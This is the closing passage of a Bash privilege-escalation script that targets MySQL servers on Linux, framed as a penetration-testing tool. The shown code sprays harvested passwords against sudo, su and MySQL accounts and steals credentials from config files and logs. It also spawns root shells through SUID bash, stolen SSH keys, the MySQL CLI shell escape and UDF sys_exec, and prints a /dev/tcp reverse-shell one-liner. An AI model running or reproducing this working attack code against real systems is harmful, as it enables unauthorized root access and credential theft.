    # --- Method 3: sudo with password ---
    log_exploit "[Reuse M3] Trying sudo with collected passwords..."

    local current_user=$(whoami)
    for pass in "${unique_passwords[@]}"; do
        local sudo_test=$(echo "$pass" | timeout 5 sudo -S -k whoami 2>/dev/null)

        if [ "$sudo_test" == "root" ]; then
            log_critical "SUDO SUCCESS for $current_user with password '$pass'"
            echo "REUSE SUCCESS [sudo]: $current_user / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Credential Reuse (sudo): DB password for $current_user"
            TARGET_USER="root"

            log_exploit "ROOT via sudo credential reuse!"
            log_info "Spawning root shell..."
            echo "$pass" | sudo -S /bin/bash
            return 0
        fi
    done

    log_info "sudo login: no matches found"

    # --- Method 4: MySQL reuse to other DB users ---
    log_exploit "[Reuse M4] Trying passwords against other MySQL users..."

    if [ -n "$mysql_cmd" ]; then
        local mysql_users=$($mysql_cmd -N -e "SELECT DISTINCT User FROM mysql.user WHERE User != '' ORDER BY User;" 2>/dev/null)

        if [ -n "$mysql_users" ]; then
            echo "$mysql_users" | while read muser; do
                for pass in "${unique_passwords[@]}"; do
                    if mysql -u "$muser" -p"$pass" -e "SELECT 1" 2>/dev/null; then
                        log_critical "MySQL login: $muser with reused password '$pass'"
                        echo "REUSE SUCCESS [mysql]: $muser / $pass" >> "$REPORT_FILE"

                        # Check this user's privileges
                        local mgrants=$(mysql -u "$muser" -p"$pass" -e "SHOW GRANTS;" 2>/dev/null)
                        if echo "$mgrants" | grep -qiE "ALL PRIVILEGES|FILE|SUPER"; then
                            log_exploit "MySQL user $muser has HIGH privileges!"
                            log_info "Grants: $mgrants"
                        fi

                        # If this user is also a system user, try su
                        if id "$muser" &>/dev/null; then
                            local su_try=$(echo "$pass" | timeout 5 su - "$muser" -c "whoami" 2>/dev/null)
                            if [ "$su_try" == "$muser" ]; then
                                log_critical "DOUBLE REUSE: MySQL $muser password works for system login too!"
                                echo "DOUBLE REUSE: $muser / $pass" >> "$REPORT_FILE"
                            fi
                        fi
                    fi
                done
            done
        fi
    fi

    # Summary
    if [ $SUCCESS -eq 0 ]; then
        log_warning "Credential reuse attack: no successful logins"
        log_info "Collected $total_passwords passwords, tested against $total_users users"
    fi

    echo ""
}

# Drop to interactive shell - handles ALL escalation types
drop_to_shell() {
    local current_user=$(whoami)
    local current_uid=$(id -u)

    echo ""
    log_success "═══════════════════════════════════════════"
    log_success "  PRIVILEGE ESCALATION SUCCESSFUL!"
    log_success "═══════════════════════════════════════════"
    log_success "Method: $ESCALATION_METHOD"
    log_success "Target: $TARGET_USER"
    log_success "Current: $current_user (UID: $current_uid)"
    echo ""

    if [ "$current_uid" -eq 0 ]; then
        log_critical "ROOT ACCESS ACHIEVED!"
    else
        log_success "Pivoted to user: $current_user"
    fi

    echo ""
    log_info "Type 'exit' to generate report"
    echo ""

    # Try multiple methods to get an interactive shell as TARGET_USER
    local shell_spawned=0

    # If already root (e.g. SUID bash succeeded in-process), just bash -i
    if [ "$(id -u)" -eq 0 ]; then
        /bin/bash -i
        shell_spawned=1
        return 0
    fi

    # Method A: SUID /bin/bash -p (after cron/systemd/UDF set SUID bit)
    if [ $shell_spawned -eq 0 ] && [ -u /bin/bash ]; then
        log_info "Spawning shell via SUID /bin/bash -p..."
        /bin/bash -p -i
        shell_spawned=1
        return 0
    fi

    # Method B: SUID shell at /tmp/.mysql_suid_shell
    if [ $shell_spawned -eq 0 ] && [ -u /tmp/.mysql_suid_shell ] 2>/dev/null; then
        log_info "Spawning shell via /tmp/.mysql_suid_shell..."
        /tmp/.mysql_suid_shell
        shell_spawned=1
        return 0
    fi

    # Method C: SSH key login
    if [ $shell_spawned -eq 0 ] && [ -f /tmp/.priv_key ]; then
        chmod 600 /tmp/.priv_key 2>/dev/null
        if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes "${TARGET_USER}@localhost" "whoami" 2>/dev/null | grep -qE "${TARGET_USER}|root"; then
            log_info "Spawning interactive SSH shell as $TARGET_USER..."
            ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -t "${TARGET_USER}@localhost"
            shell_spawned=1
            return 0
        fi
    fi

    # Method D: Stolen SSH key
    if [ $shell_spawned -eq 0 ] && [ -f /tmp/.stolen_key ]; then
        chmod 600 /tmp/.stolen_key 2>/dev/null
        if ssh -i /tmp/.stolen_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes "${TARGET_USER}@localhost" "whoami" 2>/dev/null | grep -qE "${TARGET_USER}|root"; then
            log_info "Spawning interactive SSH shell with stolen key..."
            ssh -i /tmp/.stolen_key -o StrictHostKeyChecking=no -t "${TARGET_USER}@localhost"
            shell_spawned=1
            return 0
        fi
    fi

    # Method E: su with known password from CREDS_FILE
    if [ $shell_spawned -eq 0 ] && [ -s "$CREDS_FILE" ]; then
        while IFS=: read -r cuser cpass csource; do
            if [ -z "$cpass" ]; then continue; fi

            if command -v expect &>/dev/null; then
                local su_test=$(expect -c "
                    log_user 0
                    set timeout 5
                    spawn su - ${TARGET_USER} -c whoami
                    expect -re \".*assword.*\" { send \"${cpass}\r\" }
                    expect {
                        \"${TARGET_USER}\" { exit 0 }
                        \"root\" { exit 0 }
                        default { exit 1 }
                    }
                " 2>/dev/null)

                if [ $? -eq 0 ]; then
                    log_info "Spawning interactive shell as $TARGET_USER via su..."
                    expect -c "
                        set timeout 5
                        spawn su - ${TARGET_USER}
                        expect -re \".*assword.*\"
                        send \"${cpass}\r\"
                        interact
                    " 2>/dev/null
                    shell_spawned=1
                    return 0
                fi
            else
                local su_result=$(echo "$cpass" | timeout 5 su - "${TARGET_USER}" -c "whoami" 2>/dev/null)
                if [ "$su_result" == "${TARGET_USER}" ] || [ "$su_result" == "root" ]; then
                    log_info "Password works for su - $TARGET_USER"
                    log_info "Run manually: su - $TARGET_USER (password: $cpass)"
                    echo "$cpass" | su - "${TARGET_USER}" 2>/dev/null
                    shell_spawned=1
                    return 0
                fi
            fi
        done < "$CREDS_FILE"
    fi

    # Method F: sshpass with known password
    if [ $shell_spawned -eq 0 ] && [ -s "$CREDS_FILE" ] && command -v sshpass &>/dev/null; then
        while IFS=: read -r cuser cpass csource; do
            [ -z "$cpass" ] && continue
            if sshpass -p "$cpass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password "${TARGET_USER}@localhost" "whoami" 2>/dev/null | grep -qE "${TARGET_USER}|root"; then
                log_info "Spawning interactive SSH shell as $TARGET_USER..."
                sshpass -p "$cpass" ssh -o StrictHostKeyChecking=no -t "${TARGET_USER}@localhost"
                shell_spawned=1
                return 0
            fi
        done < "$CREDS_FILE"
    fi

    # Method G: sudo with known password
    if [ $shell_spawned -eq 0 ] && [ -s "$CREDS_FILE" ]; then
        while IFS=: read -r cuser cpass csource; do
            [ -z "$cpass" ] && continue
            local sudo_test=$(echo "$cpass" | timeout 5 sudo -S -k whoami 2>/dev/null)
            if [ "$sudo_test" == "root" ]; then
                log_info "Spawning root shell via sudo..."
                echo "$cpass" | sudo -S /bin/bash -i
                shell_spawned=1
                return 0
            fi
        done < "$CREDS_FILE"
    fi

    # Method H: MySQL CLI shell escape
    if [ $shell_spawned -eq 0 ] && [ -n "$MYSQL_CMD" ]; then
        local cli_test=$($MYSQL_CMD -e "\! whoami" 2>/dev/null)
        if [ -n "$cli_test" ]; then
            log_info "Spawning shell via MySQL CLI \\! escape..."
            log_info "Running: $MYSQL_CMD -e '\\! /bin/bash -i'"
            $MYSQL_CMD -e "\! /bin/bash -i" 2>/dev/null
            shell_spawned=1
            return 0
        fi
    fi

    # Method I: UDF sys_exec if available
    if [ $shell_spawned -eq 0 ] && [ -n "$MYSQL_CMD" ]; then
        local udf_avail=$($MYSQL_CMD -N -e "SELECT name FROM mysql.func WHERE name IN ('sys_exec','sys_eval');" 2>/dev/null)
        if [ -n "$udf_avail" ]; then
            log_info "UDF available - attempting reverse shell setup..."
            log_info "To get interactive shell manually:"
            log_info "  1) Start listener: nc -lvnp 4444"
            log_info "  2) Run: SELECT sys_exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1');"

            # Try direct SUID bash via UDF
            $MYSQL_CMD -e "SELECT sys_exec('chmod u+s /bin/bash');" 2>/dev/null
            sleep 1
            if [ -u /bin/bash ]; then
                log_info "SUID set via UDF! Spawning..."
                /bin/bash -p -i
                shell_spawned=1
                return 0
            fi
        fi
    fi

    # Fallback: regular shell with instructions
    if [ $shell_spawned -eq 0 ]; then
        log_warning "Could not auto-spawn interactive shell as $TARGET_USER"
        log_info "Manual escalation instructions:"
        log_info "  Method: $ESCALATION_METHOD"

        if [ -f /tmp/.priv_key ]; then
            log_info "  SSH: ssh -i /tmp/.priv_key ${TARGET_USER}@localhost"
        fi
        if [ -f /tmp/.stolen_key ]; then
            log_info "  SSH: ssh -i /tmp/.stolen_key ${TARGET_USER}@localhost"
        fi
        if [ -u /bin/bash ]; then
            log_info "  SUID: /bin/bash -p"
        fi

        echo ""
        log_info "Dropping to current user shell..."
        /bin/bash -i
    fi
}

# Generate report
generate_final_report() {
    echo "" >> "$REPORT_FILE"
    echo "════════════════════════════════════════════════════════════════" >> "$REPORT_FILE"
    echo "EXPLOITATION SUMMARY" >> "$REPORT_FILE"
    echo "════════════════════════════════════════════════════════════════" >> "$REPORT_FILE"
    
    if [ $SUCCESS -eq 1 ]; then
        echo "" >> "$REPORT_FILE"
        echo "STATUS: ✓ EXPLOITATION SUCCESSFUL" >> "$REPORT_FILE"
        echo "METHOD: $ESCALATION_METHOD" >> "$REPORT_FILE"
        echo "TARGET: $TARGET_USER" >> "$REPORT_FILE"
        
        if [ -n "$MYSQL_PROCESS_USER" ]; then
            echo "MYSQL PROCESS USER: $MYSQL_PROCESS_USER" >> "$REPORT_FILE"
        fi
        
        echo "" >> "$REPORT_FILE"
        echo "IMPACT: CRITICAL" >> "$REPORT_FILE"
        
        if [ "$MYSQL_PROCESS_USER" == "root" ]; then
            echo "  - MySQL running as root = Full system compromise" >> "$REPORT_FILE"
            echo "  - Any file written via MySQL is owned by root" >> "$REPORT_FILE"
            echo "  - Direct path to root access" >> "$REPORT_FILE"
        fi
    else
        echo "" >> "$REPORT_FILE"
        echo "STATUS: ✗ EXPLOITATION FAILED" >> "$REPORT_FILE"
        echo "MySQL Process User: ${MYSQL_PROCESS_USER:-Unknown}" >> "$REPORT_FILE"
    fi
    
    echo "" >> "$REPORT_FILE"
    echo "Report completed: $(date)" >> "$REPORT_FILE"
    
    rm -f "$CREDS_FILE" "$USERS_FILE" 2>/dev/null
}

# Main
main() {
    show_banner
    
    echo -e "${RED}⚠️  WARNING: AUTHORIZED TESTING ONLY!${NC}"
    echo ""
    echo -n "Continue? (yes/no): "
    read -r confirm
    
    if [ "$confirm" != "yes" ]; then
        exit 0
    fi
    
    echo ""
    init_report
    
    log_info "Starting advanced privilege escalation v2.2..."
    echo ""
    
    # Phase 1: Detect MySQL process user
    detect_mysql_process_user
    echo ""
    
    # Phase 2: Info disclosure to find credentials
    try_deep_info_disclosure

    if [ $SUCCESS -eq 1 ]; then
        drop_to_shell
    fi

    echo ""
    
    # Phase 3: MySQL context-based exploitation (INTO OUTFILE)
    try_mysql_context_exploit
    
    if [ $SUCCESS -eq 1 ]; then
        drop_to_shell
    fi

    # Phase 4: Advanced methods
    echo ""
    log_info "=========================================="
    log_info "  STARTING ADVANCED EXPLOITATION PHASE"
    log_info "=========================================="
    echo ""

    # --- 4A: MySQL-dependent methods (need MYSQL_CMD) ---
    if [ -n "$MYSQL_CMD" ]; then
        log_info "MySQL connection available: $MYSQL_CMD"
        echo ""

        check_mysql_security_config "$MYSQL_CMD"

        check_mysql_misconfigurations "$MYSQL_CMD"

        if [ $SUCCESS -eq 0 ]; then
            try_mysql_cli_shell_escape "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell

        try_mysql_hash_dump "$MYSQL_CMD"
        try_information_schema_enum "$MYSQL_CMD"
        try_processlist_sniff "$MYSQL_CMD"
        try_binlog_extraction "$MYSQL_CMD"
        try_mysql_variables_dump "$MYSQL_CMD"
    else
        log_warning "MySQL connection not established - running non-MySQL checks only"
        echo "" >> "$REPORT_FILE"
        echo "═══ MYSQL CONNECTION FAILED ═══" >> "$REPORT_FILE"
        echo "All MySQL-dependent exploitation methods skipped" >> "$REPORT_FILE"
    fi

    # --- 4B: System misconfiguration audit (ALWAYS runs, no MySQL needed) ---
    echo ""
    check_system_misconfigurations

    # --- 4C: Filesystem-based methods (do NOT need MYSQL_CMD) ---
    log_info "Running filesystem-based scans..."
    echo ""

    try_history_file_scan "$MYSQL_CMD"
    try_backup_file_scan "$MYSQL_CMD"

    # --- 4D: Credential reuse (works with ANY collected creds) ---
    if [ $SUCCESS -eq 0 ]; then
        echo ""
        try_credential_reuse_attack "$MYSQL_CMD"
    fi
    [ $SUCCESS -eq 1 ] && drop_to_shell

    # --- 4E: MySQL file write exploits (need MYSQL_CMD + FILE privilege) ---
    if [ -n "$MYSQL_CMD" ]; then
        if [ $SUCCESS -eq 0 ]; then
            echo ""
            try_udf_exploitation "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell

        if [ $SUCCESS -eq 0 ]; then
            echo ""
            try_general_log_exploit "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell

        if [ $SUCCESS -eq 0 ]; then
            echo ""
            try_slow_query_log_exploit "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell

        if [ $SUCCESS -eq 0 ]; then
            echo ""
            try_load_data_read_files "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell

        if [ $SUCCESS -eq 0 ]; then
            echo ""
            try_mysql_dumpfile_exploit "$MYSQL_CMD"
        fi
        [ $SUCCESS -eq 1 ] && drop_to_shell
    fi

    # --- 4F: Filesystem misconfiguration checks (NO MySQL needed) ---
    if [ -z "$MYSQL_CMD" ]; then
        echo ""
        log_info "=========================================="
        log_info "  FILESYSTEM MISCONFIGURATION CHECKS"
        log_info "  (MySQL connection unavailable)"
        log_info "=========================================="
        echo "" >> "$REPORT_FILE"
        echo "═══ FILESYSTEM MISCONFIGURATION (no MySQL) ═══" >> "$REPORT_FILE"

        local fs_misconfig=0

        # Check MySQL config files readable/writable
        log_info "Checking MySQL config file permissions..."

        local cfg_files=("/etc/my.cnf" "/etc/mysql/my.cnf" "/etc/mysql/mariadb.cnf"
                        "/etc/mysql/debian.cnf" "/etc/mysql/conf.d/" "/etc/mysql/mysql.conf.d/")

        for cf in "${cfg_files[@]}"; do
            if [ -e "$cf" ]; then
                local cf_perms=$(stat -c "%a %U:%G" "$cf" 2>/dev/null)
                local cf_other=${cf_perms:2:1}

                if [ -r "$cf" ]; then
                    log_success "  READABLE: $cf ($cf_perms)"

                    if [ -f "$cf" ]; then
                        local cf_pass=$(grep -iE "^password|^user" "$cf" 2>/dev/null)
                        if [ -n "$cf_pass" ]; then
                            log_critical "  Credentials in $cf:"
                            echo "$cf_pass" | while read pl; do
                                log_exploit "    $pl"
                                echo "FS_CONFIG_CRED: $pl" >> "$REPORT_FILE"

                                local ext_pass=$(echo "$pl" | grep -oP '(?<==\s*)\S+' | tr -d "'" | tr -d '"')
                                if [ -n "$ext_pass" ]; then
                                    echo "mysql_config:$ext_pass:my.cnf" >> "$CREDS_FILE"
                                    FOUND_PASSWORDS["_mycnf_fs"]="$ext_pass"
                                fi
                            done
                            fs_misconfig=$((fs_misconfig + 1))
                        fi
                    fi
                fi

                if [ -w "$cf" ]; then
                    log_critical "  WRITABLE: $cf"
                    echo "FS_MISCONFIG: Writable $cf" >> "$REPORT_FILE"
                    fs_misconfig=$((fs_misconfig + 1))
                fi
            fi
        done

        # Check writable startup scripts
        log_info "Checking MySQL startup scripts..."

        local startup_scripts=("/usr/bin/mysqld_safe" "/etc/init.d/mysql" "/etc/init.d/mysqld"
                              "/etc/init.d/mariadb" "/usr/lib/systemd/system/mysql.service"
                              "/usr/lib/systemd/system/mysqld.service" "/usr/lib/systemd/system/mariadb.service"
                              "/etc/systemd/system/mysql.service" "/etc/systemd/system/mysqld.service")

        for ss in "${startup_scripts[@]}"; do
            if [ -w "$ss" ]; then
                log_critical "  WRITABLE STARTUP: $ss"
                echo "FS_MISCONFIG: Writable startup $ss" >> "$REPORT_FILE"
                fs_misconfig=$((fs_misconfig + 1))
            fi
        done

        # Check data directory
        local datadir="/var/lib/mysql"
        if [ -d "$datadir" ]; then
            if [ -r "$datadir" ]; then
                log_warning "  MySQL data directory readable: $datadir"
                local world_files=$(find "$datadir" -maxdepth 2 -perm -o+r -type f 2>/dev/null | head -10)
                if [ -n "$world_files" ]; then
                    log_warning "  World-readable data files found"
                    fs_misconfig=$((fs_misconfig + 1))
                fi
            fi
            if [ -w "$datadir" ]; then
                log_critical "  MySQL data directory WRITABLE: $datadir"
                fs_misconfig=$((fs_misconfig + 1))
            fi
        fi

        # Check MySQL plugin directory
        local plugin_dirs=("/usr/lib/mysql/plugin" "/usr/lib64/mysql/plugin"
                          "/usr/lib/x86_64-linux-gnu/mariadb19/plugin" "/usr/lib/mariadb/plugin")
        for pd in "${plugin_dirs[@]}"; do
            if [ -d "$pd" ] && [ -w "$pd" ]; then
                log_critical "  Plugin directory WRITABLE: $pd (can place UDF without MySQL access!)"
                echo "FS_MISCONFIG: Writable plugin dir $pd" >> "$REPORT_FILE"
                fs_misconfig=$((fs_misconfig + 1))
            fi
        done

        # Check log files
        log_info "Checking MySQL log files..."

        local log_paths=("/var/log/mysql/" "/var/log/mysql/error.log" "/var/log/mysql/mysql.log"
                        "/var/log/mysqld.log" "/var/log/mariadb/")

        for lp in "${log_paths[@]}"; do
            if [ -r "$lp" ] && [ -f "$lp" ]; then
                log_success "  READABLE LOG: $lp"

                local log_creds=$(grep -iE "Access denied.*using password|IDENTIFIED BY|SET PASSWORD" "$lp" 2>/dev/null | tail -10)
                if [ -n "$log_creds" ]; then
                    log_critical "  Credential info in log $lp:"
                    echo "$log_creds" | head -5 | while read ll; do
                        log_info "    $ll"
                    done
                    echo "FS_LOG_CRED: $lp" >> "$REPORT_FILE"
                    fs_misconfig=$((fs_misconfig + 1))
                fi
            fi
        done

        # Check process arguments for skip-grant-tables
        local skip_proc=$(_ps_aux | grep -E "mysqld|mariadbd" | grep -v grep | grep -i "skip-grant")
        if [ -n "$skip_proc" ]; then
            log_critical "  skip-grant-tables detected in process arguments!"
            echo "FS_MISCONFIG: skip-grant-tables in process" >> "$REPORT_FILE"
            fs_misconfig=$((fs_misconfig + 1))
        fi

        # Check !includedir for writable directories
        for mcnf in "/etc/my.cnf" "/etc/mysql/my.cnf"; do
            if [ -r "$mcnf" ]; then
                grep "^!includedir" "$mcnf" 2>/dev/null | while read inc_line; do
                    local inc_dir=$(echo "$inc_line" | awk '{print $2}')
                    if [ -w "$inc_dir" ]; then
                        log_critical "  !includedir WRITABLE: $inc_dir"
                        log_exploit "  Drop malicious .cnf for code exec on MySQL restart!"
                        echo "FS_MISCONFIG: Writable includedir $inc_dir" >> "$REPORT_FILE"
                        fs_misconfig=$((fs_misconfig + 1))
                    fi
                done
            fi
        done

        echo "" | tee -a "$REPORT_FILE"
        if [ $fs_misconfig -gt 0 ]; then
            log_critical "FILESYSTEM MISCONFIGURATIONS FOUND: $fs_misconfig"
            echo "FS_MISCONFIG_TOTAL: $fs_misconfig" >> "$REPORT_FILE"

            # Retry MySQL connection if we found new creds from config files
            if [ -s "$CREDS_FILE" ]; then
                log_info "Retrying MySQL connection with newly found credentials..."
                try_mysql_context_exploit
                if [ -n "$MYSQL_CMD" ]; then
                    log_success "MySQL connection established on retry!"
                    check_mysql_security_config "$MYSQL_CMD"
                    check_mysql_misconfigurations "$MYSQL_CMD"
                fi
            fi
        else
            log_info "No filesystem misconfigurations found"
        fi
    fi
    
    # Generate report
    echo ""
    generate_final_report
    
    # Summary
    echo ""
    if [ $SUCCESS -eq 1 ]; then
        log_success "EXPLOITATION: SUCCESS"
        log_success "Method: $ESCALATION_METHOD"
    else
        log_error "EXPLOITATION: FAILED"
    fi
    
    log_info "Report: $REPORT_FILE"
    echo ""
}

main "$@"
